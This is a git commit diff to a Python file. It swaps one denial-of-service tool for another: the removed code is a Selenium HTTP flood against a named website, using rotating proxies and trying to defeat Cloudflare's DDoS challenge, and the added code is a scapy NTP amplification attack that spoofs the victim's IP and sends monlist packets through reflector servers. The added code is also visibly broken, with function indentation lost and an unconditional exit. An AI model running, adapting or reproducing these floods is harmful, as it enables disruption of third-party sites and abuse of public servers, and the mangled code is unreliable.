ded1b1091fb8da0971ab45bc6abaffa2ce99c4ad
Kun-fy <kosakatakun@gmail.com>
2026-02-06 17:44:12 +0700

    Update draco.py

--- draco.py
+++ draco.py
@@ -1,93 +1,82 @@
-import time
+#!/usr/bin/env python
+from scapy.all import *
+import sys
 import threading
-import random
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
+import time
+#NTP Amp DOS attack
+#usage ntpdos.py <target ip> <ntpserver list> <number of threads> ex: ntpdos.py 1.2.3.4 file.txt 10
+#FOR USE ON YOUR OWN NETWORK ONLY
 
-# Read in the list of proxies from a text file
-with open("proxy.txt", "r") as f:
-    proxies = f.read().splitlines()
 
-# Set the custom user agent to use
-user_agent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
+#packet sender
+def deny():
 
-# Set the target URL to request
-target_url = "https://ventox.lol"
+    
+    global ntplist
+    global currentserver
+    global data
+    global target
+ntpserver = ntplist[currentserver] #Get new server
+currentserver = currentserver + 1 #Increment for next
+packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
+send(packet,loop=1) #SEND IT
 
-# Set the number of requests to send per second
-requests_per_second = 50
+#So I dont have to have the same stuff twice
+def printhelp():
+    print "NTP Amplification DOS Attack"
+    print "By DaRkReD"
+    print "Usage ntpdos.py <target ip> <ntpserver list> <number of threads>"
+    print "ex: ex: ntpdos.py 1.2.3.4 file.txt 10"
+    print "NTP serverlist file should contain one IP per line"
+    print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
+    exit(0)
 
-# Set the number of seconds to run the script
-run_time_seconds = 60
+if len(sys.argv) < 4:
+    printhelp()
+#Fetch Args
+target = sys.argv[1]
 
-# Set the number of threads to use
-num_threads = 70
+#Help out idiots
+if target in ("help","-h","h","?","--h","--help","/?"):
+    printhelp()
 
-# Define a function to send requests with Selenium and bypass Cloudflare
-def send_request(proxy):
-    # Create a ChromeDriver instance with Selenium
-    chrome_options = Options()
-    chrome_options.add_argument('--disable-extensions')
-    chrome_options.add_argument('--headless')
-    chrome_options.add_argument('--disable-gpu')
-    chrome_options.add_argument('--no-sandbox')
-    chrome_options.add_argument('--disable-dev-shm-usage')
-    chrome_options.add_argument(f'user-agent={user_agent}')
-    chrome_options.add_argument('--proxy-server=%s' % proxy)
-    driver = webdriver.Chrome(options=chrome_options)
+ntpserverfile = sys.argv[2]
+numberthreads = int(sys.argv[3])
+#System for accepting bulk input
+ntplist = []
+currentserver = 0
+with open(ntpserverfile) as f:
+    ntplist = f.readlines()
 
-    # Send the request to the target URL
-    driver.get(target_url)
+    
 
-    # Check if the page is protected by Cloudflare
-    if "DDoS protection by Cloudflare" in driver.title:
-        # Wait for the JavaScript challenge page to appear
-        wait = WebDriverWait(driver, 30)
-        wait.until(EC.presence_of_element_located((By.ID, "challenge-form")))
 
-        # Solve the challenge by waiting for a random amount of time
-        time.sleep(random.uniform(2, 5))
 
-        # Submit the challenge form
-        form = driver.find_element_by_id("challenge-form")
-        form.submit()
+#Make sure we dont out of bounds
+if numberthreads > int(len(ntplist)):
+    print "Attack Aborted: More threads than servers"
+    print "Next time dont create more threads than servers"
+exit(0)
 
-        # Wait until the "challenge-running" element disappears
-        wait.until_not(EC.presence_of_element_located((By.ID, "challenge-running")))
+#Magic Packet aka NTP v2 Monlist Packet
+data = "\x17\x00\x03\x2a" + "\x00" * 4
 
-    # Get the page source and quit the ChromeDriver instance
-    page_source = driver.page_source
-    driver.quit()
-
-    return page_source
-
-# Define a function to send multiple requests per second with a random proxy
-def send_requests():
-    while True:
-        proxy = random.choice(proxies)
-        try:
-            page_source = send_request(proxy)
-            print("Success with proxy:", proxy)
-            break
-        except:
-            print("Failed with proxy:", proxy)
-
-    # Wait for a random amount of time before sending the next request
-    time.sleep(random.uniform(1/requests_per_second, 1/(2*requests_per_second)))
-
-# Start the loop to send requests
-start_time = time.time()
+#Hold our threads
 threads = []
-for i in range(num_threads):
-    thread = threading.Thread(target=send_requests)
-    thread.start()
-    threads.append(thread)
-for thread in threads:
-    thread.join()
-while time.time() - start_time < run_time_seconds:
-    send_requests()
+print "Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads"
+print "Use CTRL+C to stop attack"
 
-print("Done sending requests.")
+#Thread spawner
+for n in range(numberthreads):
+    thread = threading.Thread(target=deny)
+    thread.daemon = True
+    thread.start()
+
+    threads.append(thread)
+
+#In progress!
+print "Sending..."
+
+#Keep alive so ctrl+c still kills all them threads
+while True:
+    time.sleep(1)
